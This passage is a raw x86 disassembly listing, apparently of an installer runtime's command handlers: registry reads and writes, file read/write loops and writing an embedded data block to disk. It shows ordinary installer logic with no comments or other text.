  4024c3:	e8 94 ef ff ff       	call   0x40145c
  4024c8:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4024cb:	85 c9                	test   %ecx,%ecx
  4024cd:	75 0c                	jne    0x4024db
  4024cf:	8b 0d 64 b3 47 00    	mov    0x47b364,%ecx
  4024d5:	81 c1 01 00 00 80    	add    $0x80000001,%ecx
  4024db:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4024de:	83 e2 02             	and    $0x2,%edx
  4024e1:	52                   	push   %edx
  4024e2:	50                   	push   %eax
  4024e3:	51                   	push   %ecx
  4024e4:	e8 ae ef ff ff       	call   0x401497
  4024e9:	8b f0                	mov    %eax,%esi
  4024eb:	85 f6                	test   %esi,%esi
  4024ed:	0f 84 65 07 00 00    	je     0x402c58
  4024f3:	e9 29 f2 ff ff       	jmp    0x401721
  4024f8:	85 c0                	test   %eax,%eax
  4024fa:	74 04                	je     0x402500
  4024fc:	8b f8                	mov    %eax,%edi
  4024fe:	eb 0c                	jmp    0x40250c
  402500:	8b 3d 64 b3 47 00    	mov    0x47b364,%edi
  402506:	81 c7 01 00 00 80    	add    $0x80000001,%edi
  40250c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40250f:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  402512:	6a 02                	push   $0x2
  402514:	5e                   	pop    %esi
  402515:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402518:	e8 3f ef ff ff       	call   0x40145c
  40251d:	6a 11                	push   $0x11
  40251f:	5e                   	pop    %esi
  402520:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402523:	e8 34 ef ff ff       	call   0x40145c
  402528:	33 c9                	xor    %ecx,%ecx
  40252a:	51                   	push   %ecx
  40252b:	8d 55 08             	lea    0x8(%ebp),%edx
  40252e:	52                   	push   %edx
  40252f:	8b 15 90 b3 47 00    	mov    0x47b390,%edx
  402535:	51                   	push   %ecx
  402536:	83 ca 02             	or     $0x2,%edx
  402539:	52                   	push   %edx
  40253a:	51                   	push   %ecx
  40253b:	51                   	push   %ecx
  40253c:	51                   	push   %ecx
  40253d:	50                   	push   %eax
  40253e:	57                   	push   %edi
  40253f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402546:	ff 15 14 80 40 00    	call   *0x408014
  40254c:	85 c0                	test   %eax,%eax
  40254e:	0f 85 04 07 00 00    	jne    0x402c58
  402554:	bf f8 20 41 00       	mov    $0x4120f8,%edi
  402559:	83 fb 01             	cmp    $0x1,%ebx
  40255c:	75 12                	jne    0x402570
  40255e:	6a 23                	push   $0x23
  402560:	5e                   	pop    %esi
  402561:	e8 f6 ee ff ff       	call   0x40145c
  402566:	57                   	push   %edi
  402567:	e8 c5 36 00 00       	call   0x405c31
  40256c:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  402570:	83 fb 04             	cmp    $0x4,%ebx
  402573:	75 0f                	jne    0x402584
  402575:	6a 03                	push   $0x3
  402577:	59                   	pop    %ecx
  402578:	e8 c9 ee ff ff       	call   0x401446
  40257d:	53                   	push   %ebx
  40257e:	a3 f8 20 41 00       	mov    %eax,0x4120f8
  402583:	58                   	pop    %eax
  402584:	83 fb 03             	cmp    $0x3,%ebx
  402587:	75 10                	jne    0x402599
  402589:	68 18 c0 00 00       	push   $0xc018
  40258e:	57                   	push   %edi
  40258f:	6a 00                	push   $0x0
  402591:	ff 75 e8             	push   -0x18(%ebp)
  402594:	e8 1f 0b 00 00       	call   0x4030b8
  402599:	50                   	push   %eax
  40259a:	57                   	push   %edi
  40259b:	ff 75 c4             	push   -0x3c(%ebp)
  40259e:	6a 00                	push   $0x0
  4025a0:	ff 75 cc             	push   -0x34(%ebp)
  4025a3:	ff 75 08             	push   0x8(%ebp)
  4025a6:	ff 15 18 80 40 00    	call   *0x408018
  4025ac:	85 c0                	test   %eax,%eax
  4025ae:	75 03                	jne    0x4025b3
  4025b0:	21 45 fc             	and    %eax,-0x4(%ebp)
  4025b3:	ff 75 08             	push   0x8(%ebp)
  4025b6:	ff 15 08 80 40 00    	call   *0x408008
  4025bc:	e9 97 06 00 00       	jmp    0x402c58
  4025c1:	68 19 00 02 00       	push   $0x20019
  4025c6:	e8 82 ef ff ff       	call   0x40154d
  4025cb:	6a 33                	push   $0x33
  4025cd:	5e                   	pop    %esi
  4025ce:	8b d8                	mov    %eax,%ebx
  4025d0:	e8 87 ee ff ff       	call   0x40145c
  4025d5:	33 c9                	xor    %ecx,%ecx
  4025d7:	66 89 0f             	mov    %cx,(%edi)
  4025da:	85 db                	test   %ebx,%ebx
  4025dc:	0f 84 3f f1 ff ff    	je     0x401721
  4025e2:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4025e5:	51                   	push   %ecx
  4025e6:	57                   	push   %edi
  4025e7:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4025ea:	51                   	push   %ecx
  4025eb:	6a 00                	push   $0x0
  4025ed:	50                   	push   %eax
  4025ee:	53                   	push   %ebx
  4025ef:	c7 45 f4 08 40 00 00 	movl   $0x4008,-0xc(%ebp)
  4025f6:	ff 15 1c 80 40 00    	call   *0x40801c
  4025fc:	33 c9                	xor    %ecx,%ecx
  4025fe:	41                   	inc    %ecx
  4025ff:	85 c0                	test   %eax,%eax
  402601:	75 37                	jne    0x40263a
  402603:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  402607:	74 1c                	je     0x402625
  402609:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  40260c:	74 06                	je     0x402614
  40260e:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402612:	75 26                	jne    0x40263a
  402614:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402617:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40261a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40261d:	33 c0                	xor    %eax,%eax
  40261f:	66 89 04 4f          	mov    %ax,(%edi,%ecx,2)
  402623:	eb 1d                	jmp    0x402642
  402625:	ff 37                	push   (%edi)
  402627:	33 c0                	xor    %eax,%eax
  402629:	39 45 ec             	cmp    %eax,-0x14(%ebp)
  40262c:	57                   	push   %edi
  40262d:	0f 94 c0             	sete   %al
  402630:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402633:	e8 2a 35 00 00       	call   0x405b62
  402638:	eb 08                	jmp    0x402642
  40263a:	33 c0                	xor    %eax,%eax
  40263c:	66 89 07             	mov    %ax,(%edi)
  40263f:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402642:	53                   	push   %ebx
  402643:	e9 6e ff ff ff       	jmp    0x4025b6
  402648:	68 19 00 02 00       	push   $0x20019
  40264d:	e8 fb ee ff ff       	call   0x40154d
  402652:	6a 03                	push   $0x3
  402654:	59                   	pop    %ecx
  402655:	8b f0                	mov    %eax,%esi
  402657:	e8 ea ed ff ff       	call   0x401446
  40265c:	33 c9                	xor    %ecx,%ecx
  40265e:	33 d2                	xor    %edx,%edx
  402660:	66 89 0f             	mov    %cx,(%edi)
  402663:	3b f2                	cmp    %edx,%esi
  402665:	0f 84 b6 f0 ff ff    	je     0x401721
  40266b:	b9 03 20 00 00       	mov    $0x2003,%ecx
  402670:	89 4d 08             	mov    %ecx,0x8(%ebp)
  402673:	39 55 ec             	cmp    %edx,-0x14(%ebp)
  402676:	74 0c                	je     0x402684
  402678:	51                   	push   %ecx
  402679:	57                   	push   %edi
  40267a:	50                   	push   %eax
  40267b:	56                   	push   %esi
  40267c:	ff 15 00 80 40 00    	call   *0x408000
  402682:	eb 19                	jmp    0x40269d
  402684:	52                   	push   %edx
  402685:	52                   	push   %edx
  402686:	52                   	push   %edx
  402687:	52                   	push   %edx
  402688:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40268b:	51                   	push   %ecx
  40268c:	57                   	push   %edi
  40268d:	50                   	push   %eax
  40268e:	56                   	push   %esi
  40268f:	ff 15 20 80 40 00    	call   *0x408020
  402695:	85 c0                	test   %eax,%eax
  402697:	0f 85 84 f0 ff ff    	jne    0x401721
  40269d:	33 c0                	xor    %eax,%eax
  40269f:	66 89 87 06 40 00 00 	mov    %ax,0x4006(%edi)
  4026a6:	56                   	push   %esi
  4026a7:	e9 0a ff ff ff       	jmp    0x4025b6
  4026ac:	66 83 3f 00          	cmpw   $0x0,(%edi)
  4026b0:	0f 84 a2 05 00 00    	je     0x402c58
  4026b6:	57                   	push   %edi
  4026b7:	e8 bf 34 00 00       	call   0x405b7b
  4026bc:	50                   	push   %eax
  4026bd:	ff 15 bc 80 40 00    	call   *0x4080bc
  4026c3:	e9 90 05 00 00       	jmp    0x402c58
  4026c8:	6a ed                	push   $0xffffffed
  4026ca:	5e                   	pop    %esi
  4026cb:	e8 8c ed ff ff       	call   0x40145c
  4026d0:	ff 75 e4             	push   -0x1c(%ebp)
  4026d3:	ff 75 e0             	push   -0x20(%ebp)
  4026d6:	50                   	push   %eax
  4026d7:	e8 85 33 00 00       	call   0x405a61
  4026dc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4026df:	0f 85 6c 05 00 00    	jne    0x402c51
  4026e5:	33 c0                	xor    %eax,%eax
  4026e7:	66 89 07             	mov    %ax,(%edi)
  4026ea:	e9 32 f0 ff ff       	jmp    0x401721
  4026ef:	bb 04 20 00 00       	mov    $0x2004,%ebx
  4026f4:	53                   	push   %ebx
  4026f5:	6a 40                	push   $0x40
  4026f7:	ff 15 20 81 40 00    	call   *0x408120
  4026fd:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  402701:	8b f0                	mov    %eax,%esi
  402703:	89 75 08             	mov    %esi,0x8(%ebp)
  402706:	74 0f                	je     0x402717
  402708:	33 c9                	xor    %ecx,%ecx
  40270a:	41                   	inc    %ecx
  40270b:	e8 36 ed ff ff       	call   0x401446
  402710:	88 06                	mov    %al,(%esi)
  402712:	33 c0                	xor    %eax,%eax
  402714:	40                   	inc    %eax
  402715:	eb 28                	jmp    0x40273f
  402717:	6a 11                	push   $0x11
  402719:	5e                   	pop    %esi
  40271a:	e8 3d ed ff ff       	call   0x40145c
  40271f:	33 c0                	xor    %eax,%eax
  402721:	50                   	push   %eax
  402722:	50                   	push   %eax
  402723:	53                   	push   %ebx
  402724:	ff 75 08             	push   0x8(%ebp)
  402727:	6a ff                	push   $0xffffffff
  402729:	68 f0 e0 40 00       	push   $0x40e0f0
  40272e:	50                   	push   %eax
  40272f:	50                   	push   %eax
  402730:	ff 15 44 81 40 00    	call   *0x408144
  402736:	ff 75 08             	push   0x8(%ebp)
  402739:	ff 15 4c 81 40 00    	call   *0x40814c
  40273f:	66 83 3f 00          	cmpw   $0x0,(%edi)
  402743:	74 1b                	je     0x402760
  402745:	6a 00                	push   $0x0
  402747:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40274a:	51                   	push   %ecx
  40274b:	50                   	push   %eax
  40274c:	ff 75 08             	push   0x8(%ebp)
  40274f:	57                   	push   %edi
  402750:	e8 26 34 00 00       	call   0x405b7b
  402755:	50                   	push   %eax
  402756:	ff 15 50 81 40 00    	call   *0x408150
  40275c:	85 c0                	test   %eax,%eax
  40275e:	75 07                	jne    0x402767
  402760:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402767:	ff 75 08             	push   0x8(%ebp)
  40276a:	e9 ca f9 ff ff       	jmp    0x402139
  40276f:	6a 02                	push   $0x2
  402771:	59                   	pop    %ecx
  402772:	33 f6                	xor    %esi,%esi
  402774:	e8 cd ec ff ff       	call   0x401446
  402779:	83 f8 01             	cmp    $0x1,%eax
  40277c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40277f:	0f 8c d3 04 00 00    	jl     0x402c58
  402785:	b9 03 20 00 00       	mov    $0x2003,%ecx
  40278a:	3b c1                	cmp    %ecx,%eax
  40278c:	7e 03                	jle    0x402791
  40278e:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402791:	66 39 37             	cmp    %si,(%edi)
  402794:	0f 84 b3 00 00 00    	je     0x40284d
  40279a:	57                   	push   %edi
  40279b:	c6 45 d3 00          	movb   $0x0,-0x2d(%ebp)
  40279f:	e8 d7 33 00 00       	call   0x405b7b
  4027a4:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  4027a7:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4027aa:	0f 8e 9d 00 00 00    	jle    0x40284d
  4027b0:	6a 00                	push   $0x0
  4027b2:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4027b5:	50                   	push   %eax
  4027b6:	6a 01                	push   $0x1
  4027b8:	8d 45 0b             	lea    0xb(%ebp),%eax
  4027bb:	50                   	push   %eax
  4027bc:	ff 75 d4             	push   -0x2c(%ebp)
  4027bf:	ff 15 54 81 40 00    	call   *0x408154
  4027c5:	85 c0                	test   %eax,%eax
  4027c7:	0f 84 80 00 00 00    	je     0x40284d
  4027cd:	83 7d c4 01          	cmpl   $0x1,-0x3c(%ebp)
  4027d1:	75 7a                	jne    0x40284d
  4027d3:	33 ff                	xor    %edi,%edi
  4027d5:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4027d8:	75 39                	jne    0x402813
  4027da:	6a 02                	push   $0x2
  4027dc:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4027df:	50                   	push   %eax
  4027e0:	6a 01                	push   $0x1
  4027e2:	8d 45 0b             	lea    0xb(%ebp),%eax
  4027e5:	50                   	push   %eax
  4027e6:	57                   	push   %edi
  4027e7:	57                   	push   %edi
  4027e8:	ff 15 58 81 40 00    	call   *0x408158
  4027ee:	8a 45 d3             	mov    -0x2d(%ebp),%al
  4027f1:	3c 0d                	cmp    $0xd,%al
  4027f3:	74 2e                	je     0x402823
  4027f5:	3c 0a                	cmp    $0xa,%al
  4027f7:	74 2a                	je     0x402823
  4027f9:	66 8b 45 f8          	mov    -0x8(%ebp),%ax
  4027fd:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  402801:	8a 45 0b             	mov    0xb(%ebp),%al
  402804:	46                   	inc    %esi
  402805:	88 45 d3             	mov    %al,-0x2d(%ebp)
  402808:	84 c0                	test   %al,%al
  40280a:	74 41                	je     0x40284d
  40280c:	3b 75 f4             	cmp    -0xc(%ebp),%esi
  40280f:	7c 9f                	jl     0x4027b0
  402811:	eb 3a                	jmp    0x40284d
  402813:	0f b6 45 0b          	movzbl 0xb(%ebp),%eax
  402817:	50                   	push   %eax
  402818:	53                   	push   %ebx
  402819:	e8 44 33 00 00       	call   0x405b62
  40281e:	e9 3e 04 00 00       	jmp    0x402c61
  402823:	3a 45 0b             	cmp    0xb(%ebp),%al
  402826:	74 17                	je     0x40283f
  402828:	80 7d 0b 0d          	cmpb   $0xd,0xb(%ebp)
  40282c:	74 06                	je     0x402834
  40282e:	80 7d 0b 0a          	cmpb   $0xa,0xb(%ebp)
  402832:	75 0b                	jne    0x40283f
  402834:	66 8b 45 f8          	mov    -0x8(%ebp),%ax
  402838:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  40283c:	46                   	inc    %esi
  40283d:	eb 0e                	jmp    0x40284d
  40283f:	6a 01                	push   $0x1
  402841:	57                   	push   %edi
  402842:	6a ff                	push   $0xffffffff
  402844:	ff 75 d4             	push   -0x2c(%ebp)
  402847:	ff 15 5c 81 40 00    	call   *0x40815c
  40284d:	33 c0                	xor    %eax,%eax
  40284f:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  402853:	85 f6                	test   %esi,%esi
  402855:	e9 c1 ee ff ff       	jmp    0x40171b
  40285a:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40285e:	74 13                	je     0x402873
  402860:	33 c9                	xor    %ecx,%ecx
  402862:	41                   	inc    %ecx
  402863:	e8 de eb ff ff       	call   0x401446
  402868:	66 a3 f0 e0 40 00    	mov    %ax,0x40e0f0
  40286e:	33 c0                	xor    %eax,%eax
  402870:	40                   	inc    %eax
  402871:	eb 0e                	jmp    0x402881
  402873:	6a 11                	push   $0x11
  402875:	5e                   	pop    %esi
  402876:	e8 e1 eb ff ff       	call   0x40145c
  40287b:	50                   	push   %eax
  40287c:	e8 b0 33 00 00       	call   0x405c31
  402881:	66 83 3f 00          	cmpw   $0x0,(%edi)
  402885:	0f 84 96 ee ff ff    	je     0x401721
  40288b:	6a 00                	push   $0x0
  40288d:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402890:	51                   	push   %ecx
  402891:	03 c0                	add    %eax,%eax
  402893:	50                   	push   %eax
  402894:	68 f0 e0 40 00       	push   $0x40e0f0
  402899:	57                   	push   %edi
  40289a:	e8 dc 32 00 00       	call   0x405b7b
  40289f:	50                   	push   %eax
  4028a0:	ff 15 50 81 40 00    	call   *0x408150
  4028a6:	e9 6e ee ff ff       	jmp    0x401719
  4028ab:	6a 02                	push   $0x2
  4028ad:	59                   	pop    %ecx
  4028ae:	33 f6                	xor    %esi,%esi
  4028b0:	e8 91 eb ff ff       	call   0x401446
  4028b5:	83 f8 01             	cmp    $0x1,%eax
  4028b8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4028bb:	0f 8c 97 03 00 00    	jl     0x402c58
  4028c1:	b9 03 20 00 00       	mov    $0x2003,%ecx
  4028c6:	3b c1                	cmp    %ecx,%eax
  4028c8:	7e 03                	jle    0x4028cd
  4028ca:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4028cd:	66 39 37             	cmp    %si,(%edi)
  4028d0:	0f 84 77 ff ff ff    	je     0x40284d
  4028d6:	21 75 08             	and    %esi,0x8(%ebp)
  4028d9:	57                   	push   %edi
  4028da:	e8 9c 32 00 00       	call   0x405b7b
  4028df:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  4028e2:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4028e5:	0f 8e 62 ff ff ff    	jle    0x40284d
  4028eb:	8b 7d 08             	mov    0x8(%ebp),%edi
  4028ee:	6a 00                	push   $0x0
  4028f0:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4028f3:	50                   	push   %eax
  4028f4:	6a 02                	push   $0x2
  4028f6:	8d 45 08             	lea    0x8(%ebp),%eax
  4028f9:	50                   	push   %eax
  4028fa:	ff 75 d4             	push   -0x2c(%ebp)
  4028fd:	ff 15 54 81 40 00    	call   *0x408154
  402903:	85 c0                	test   %eax,%eax
  402905:	0f 84 42 ff ff ff    	je     0x40284d
  40290b:	83 7d c4 02          	cmpl   $0x2,-0x3c(%ebp)
  40290f:	0f 85 38 ff ff ff    	jne    0x40284d
  402915:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  402919:	75 2b                	jne    0x402946
  40291b:	66 83 ff 0d          	cmp    $0xd,%di
  40291f:	74 2e                	je     0x40294f
  402921:	66 83 ff 0a          	cmp    $0xa,%di
  402925:	74 28                	je     0x40294f
  402927:	66 8b 45 08          	mov    0x8(%ebp),%ax
  40292b:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  40292f:	46                   	inc    %esi
  402930:	0f b7 f8             	movzwl %ax,%edi
  402933:	66 85 c0             	test   %ax,%ax
  402936:	0f 84 11 ff ff ff    	je     0x40284d
  40293c:	3b 75 f8             	cmp    -0x8(%ebp),%esi
  40293f:	7c ad                	jl     0x4028ee
  402941:	e9 07 ff ff ff       	jmp    0x40284d
  402946:	0f b7 45 08          	movzwl 0x8(%ebp),%eax
  40294a:	e9 c8 fe ff ff       	jmp    0x402817
  40294f:	66 8b 45 08          	mov    0x8(%ebp),%ax
  402953:	66 3b f8             	cmp    %ax,%di
  402956:	74 14                	je     0x40296c
  402958:	66 83 f8 0d          	cmp    $0xd,%ax
  40295c:	0f 84 d6 fe ff ff    	je     0x402838
  402962:	66 83 f8 0a          	cmp    $0xa,%ax
  402966:	0f 84 cc fe ff ff    	je     0x402838
  40296c:	6a 01                	push   $0x1
  40296e:	6a 00                	push   $0x0
  402970:	6a fe                	push   $0xfffffffe
  402972:	e9 cd fe ff ff       	jmp    0x402844
  402977:	66 83 3f 00          	cmpw   $0x0,(%edi)
  40297b:	0f 84 d7 02 00 00    	je     0x402c58
  402981:	ff 75 e8             	push   -0x18(%ebp)
  402984:	6a 00                	push   $0x0
  402986:	6a 02                	push   $0x2
  402988:	59                   	pop    %ecx
  402989:	e8 b8 ea ff ff       	call   0x401446
  40298e:	50                   	push   %eax
  40298f:	57                   	push   %edi
  402990:	e8 e6 31 00 00       	call   0x405b7b
  402995:	50                   	push   %eax
  402996:	ff 15 5c 81 40 00    	call   *0x40815c
  40299c:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  4029a0:	0f 8c b2 02 00 00    	jl     0x402c58
  4029a6:	50                   	push   %eax
  4029a7:	53                   	push   %ebx
  4029a8:	e9 a6 02 00 00       	jmp    0x402c53
  4029ad:	66 83 3f 00          	cmpw   $0x0,(%edi)
  4029b1:	0f 84 a1 02 00 00    	je     0x402c58
  4029b7:	57                   	push   %edi
  4029b8:	e8 be 31 00 00       	call   0x405b7b
  4029bd:	50                   	push   %eax
  4029be:	ff 15 60 81 40 00    	call   *0x408160
  4029c4:	e9 8f 02 00 00       	jmp    0x402c58
  4029c9:	66 83 3b 00          	cmpw   $0x0,(%ebx)
  4029cd:	0f 84 df ee ff ff    	je     0x4018b2
  4029d3:	8d 85 5c fd ff ff    	lea    -0x2a4(%ebp),%eax
  4029d9:	50                   	push   %eax
  4029da:	53                   	push   %ebx
  4029db:	e8 9b 31 00 00       	call   0x405b7b
  4029e0:	50                   	push   %eax
  4029e1:	ff 15 64 81 40 00    	call   *0x408164
  4029e7:	85 c0                	test   %eax,%eax
  4029e9:	0f 84 c3 ee ff ff    	je     0x4018b2
  4029ef:	eb 2c                	jmp    0x402a1d
  4029f1:	6a 02                	push   $0x2
  4029f3:	5e                   	pop    %esi
  4029f4:	e8 63 ea ff ff       	call   0x40145c
  4029f9:	8d 8d 5c fd ff ff    	lea    -0x2a4(%ebp),%ecx
  4029ff:	51                   	push   %ecx
  402a00:	50                   	push   %eax
  402a01:	ff 15 68 81 40 00    	call   *0x408168
  402a07:	83 f8 ff             	cmp    $0xffffffff,%eax
  402a0a:	75 0a                	jne    0x402a16
  402a0c:	33 c0                	xor    %eax,%eax
  402a0e:	66 89 03             	mov    %ax,(%ebx)
  402a11:	e9 cf fc ff ff       	jmp    0x4026e5
  402a16:	50                   	push   %eax
  402a17:	53                   	push   %ebx
  402a18:	e8 45 31 00 00       	call   0x405b62
  402a1d:	8d 85 88 fd ff ff    	lea    -0x278(%ebp),%eax
  402a23:	50                   	push   %eax
  402a24:	57                   	push   %edi
  402a25:	e8 f1 31 00 00       	call   0x405c1b
  402a2a:	e9 29 02 00 00       	jmp    0x402c58
  402a2f:	6a f0                	push   $0xfffffff0
  402a31:	5e                   	pop    %esi
  402a32:	bb 66 fd ff ff       	mov    $0xfffffd66,%ebx
  402a37:	e8 20 ea ff ff       	call   0x40145c
  402a3c:	8b f8                	mov    %eax,%edi
  402a3e:	57                   	push   %edi
  402a3f:	89 7d cc             	mov    %edi,-0x34(%ebp)
  402a42:	e8 ee 2e 00 00       	call   0x405935
  402a47:	85 c0                	test   %eax,%eax
  402a49:	75 08                	jne    0x402a53
  402a4b:	6a ed                	push   $0xffffffed
  402a4d:	5e                   	pop    %esi
  402a4e:	e8 09 ea ff ff       	call   0x40145c
  402a53:	57                   	push   %edi
  402a54:	e8 e8 2f 00 00       	call   0x405a41
  402a59:	6a 02                	push   $0x2
  402a5b:	68 00 00 00 40       	push   $0x40000000
  402a60:	57                   	push   %edi
  402a61:	e8 fb 2f 00 00       	call   0x405a61
  402a66:	89 45 08             	mov    %eax,0x8(%ebp)
  402a69:	83 f8 ff             	cmp    $0xffffffff,%eax
  402a6c:	0f 84 9d 00 00 00    	je     0x402b0f
  402a72:	a1 0c b3 47 00       	mov    0x47b30c,%eax
  402a77:	8b 35 20 81 40 00    	mov    0x408120,%esi
  402a7d:	50                   	push   %eax
  402a7e:	6a 40                	push   $0x40
  402a80:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402a83:	ff d6                	call   *%esi
  402a85:	8b f8                	mov    %eax,%edi
  402a87:	85 ff                	test   %edi,%edi
  402a89:	74 7b                	je     0x402b06
  402a8b:	6a 00                	push   $0x0
  402a8d:	e8 91 04 00 00       	call   0x402f23
  402a92:	ff 75 d4             	push   -0x2c(%ebp)
  402a95:	57                   	push   %edi
  402a96:	e8 56 04 00 00       	call   0x402ef1
  402a9b:	ff 75 e4             	push   -0x1c(%ebp)
  402a9e:	6a 40                	push   $0x40
  402aa0:	ff d6                	call   *%esi
  402aa2:	8b f0                	mov    %eax,%esi
  402aa4:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  402aa7:	85 f6                	test   %esi,%esi
  402aa9:	74 32                	je     0x402add
  402aab:	ff 75 e4             	push   -0x1c(%ebp)
  402aae:	56                   	push   %esi
  402aaf:	6a 00                	push   $0x0
  402ab1:	ff 75 e0             	push   -0x20(%ebp)
  402ab4:	e8 ff 05 00 00       	call   0x4030b8
  402ab9:	eb 14                	jmp    0x402acf
  402abb:	8b 1e                	mov    (%esi),%ebx
  402abd:	8b 46 04             	mov    0x4(%esi),%eax
  402ac0:	53                   	push   %ebx
  402ac1:	83 c6 08             	add    $0x8,%esi
  402ac4:	56                   	push   %esi
  402ac5:	03 c7                	add    %edi,%eax
  402ac7:	50                   	push   %eax
  402ac8:	e8 50 2f 00 00       	call   0x405a1d
  402acd:	03 f3                	add    %ebx,%esi
  402acf:	80 3e 00             	cmpb   $0x0,(%esi)
  402ad2:	75 e7                	jne    0x402abb
  402ad4:	ff 75 c4             	push   -0x3c(%ebp)
  402ad7:	ff 15 2c 81 40 00    	call   *0x40812c
  402add:	33 f6                	xor    %esi,%esi
  402adf:	56                   	push   %esi
  402ae0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402ae3:	50                   	push   %eax
  402ae4:	ff 75 d4             	push   -0x2c(%ebp)
  402ae7:	57                   	push   %edi
  402ae8:	ff 75 08             	push   0x8(%ebp)
  402aeb:	ff 15 50 81 40 00    	call   *0x408150
  402af1:	57                   	push   %edi
  402af2:	ff 15 2c 81 40 00    	call   *0x40812c
  402af8:	56                   	push   %esi
  402af9:	56                   	push   %esi
  402afa:	ff 75 08             	push   0x8(%ebp)
  402afd:	6a ff                	push   $0xffffffff
  402aff:	e8 b4 05 00 00       	call   0x4030b8
  402b04:	8b d8                	mov    %eax,%ebx
  402b06:	ff 75 08             	push   0x8(%ebp)
  402b09:	ff 15 bc 80 40 00    	call   *0x4080bc
  402b0f:	6a f3                	push   $0xfffffff3
  402b11:	5e                   	pop    %esi
  402b12:	85 db                	test   %ebx,%ebx
  402b14:	7d 13                	jge    0x402b29
  402b16:	6a ef                	push   $0xffffffef
  402b18:	5e                   	pop    %esi
  402b19:	ff 75 cc             	push   -0x34(%ebp)
  402b1c:	ff 15 6c 81 40 00    	call   *0x40816c
  402b22:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402b29:	56                   	push   %esi
  402b2a:	e9 7d ec ff ff       	jmp    0x4017ac
  402b2f:	33 c9                	xor    %ecx,%ecx
  402b31:	e8 10 e9 ff ff       	call   0x401446
  402b36:	8b f8                	mov    %eax,%edi
  402b38:	3b 3d cc b2 47 00    	cmp    0x47b2cc,%edi
  402b3e:	0f 83 dd eb ff ff    	jae    0x401721
  402b44:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402b47:	8b f7                	mov    %edi,%esi
  402b49:	69 f6 20 40 00 00    	imul   $0x4020,%esi,%esi
  402b4f:	03 35 c8 b2 47 00    	add    0x47b2c8,%esi
  402b55:	85 c0                	test   %eax,%eax
  402b57:	7c 15                	jl     0x402b6e
  402b59:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402b5c:	75 0a                	jne    0x402b68
  402b5e:	83 c6 18             	add    $0x18,%esi
  402b61:	56                   	push   %esi
  402b62:	53                   	push   %ebx
  402b63:	e9 bd fe ff ff       	jmp    0x402a25
  402b68:	51                   	push   %ecx
  402b69:	e9 39 fe ff ff       	jmp    0x4029a7
  402b6e:	83 c9 ff             	or     $0xffffffff,%ecx
  402b71:	2b c8                	sub    %eax,%ecx
  402b73:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  402b76:	74 0d                	je     0x402b85
  402b78:	33 c9                	xor    %ecx,%ecx
  402b7a:	41                   	inc    %ecx
  402b7b:	e8 c6 e8 ff ff       	call   0x401446
  402b80:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402b83:	eb 13                	jmp    0x402b98
  402b85:	ff 75 ec             	push   -0x14(%ebp)
  402b88:	8d 46 18             	lea    0x18(%esi),%eax
  402b8b:	50                   	push   %eax
  402b8c:	e8 9c 36 00 00       	call   0x40622d
  402b91:	81 4e 08 00 01 00 00 	orl    $0x100,0x8(%esi)
  402b98:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402b9b:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402b9e:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402ba1:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  402ba5:	0f 84 ad 00 00 00    	je     0x402c58
  402bab:	57                   	push   %edi
  402bac:	e8 d5 e5 ff ff       	call   0x401186
  402bb1:	e9 a2 00 00 00       	jmp    0x402c58
  402bb6:	33 c9                	xor    %ecx,%ecx
  402bb8:	e8 89 e8 ff ff       	call   0x401446
  402bbd:	83 f8 20             	cmp    $0x20,%eax
  402bc0:	0f 83 5b eb ff ff    	jae    0x401721
  402bc6:	33 f6                	xor    %esi,%esi
  402bc8:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  402bcb:	74 1f                	je     0x402bec
  402bcd:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
